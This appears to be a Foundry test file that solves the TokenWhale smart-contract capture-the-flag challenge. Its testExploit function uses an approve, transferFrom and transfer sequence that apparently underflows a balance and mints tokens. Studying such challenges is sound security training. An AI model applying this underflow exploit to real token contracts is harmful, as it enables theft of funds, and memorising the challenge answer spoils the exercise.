// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/TokenWhale.sol";

contract TokenWhaleTest is Test {
    TokenWhale public tokenWhale;
    ExploitContract public exploitContract;
    // Feel free to use these random addresses
    address constant Alice = address(0x5E12E7);
    address constant Bob = address(0x5311E8);
    address constant Pete = address(0x5E41E9);

    function setUp() public {
        // Deploy contracts
        tokenWhale = new TokenWhale(Alice);
        exploitContract = new ExploitContract(tokenWhale);

        vm.deal(Alice, 100 ether);
        vm.deal(Bob, 100 ether);
        vm.deal(Pete, 100 ether);
    }

    // Use the instance tokenWhale and exploitContract
    // Use vm.startPrank and vm.stopPrank to change between msg.sender
    function testExploit() public {
        // Put your solution here
        vm.startPrank(Alice);
        tokenWhale.approve(Bob, 500);

        vm.startPrank(Bob);
        tokenWhale.transferFrom(Alice, Alice, 10);

        vm.startPrank(Bob);
        tokenWhale.transfer(Alice, 2000000);

        _checkSolved();
    }

    function _checkSolved() internal {
        assertTrue(tokenWhale.isComplete(), "Challenge Incomplete");
    }

    receive() external payable {}
}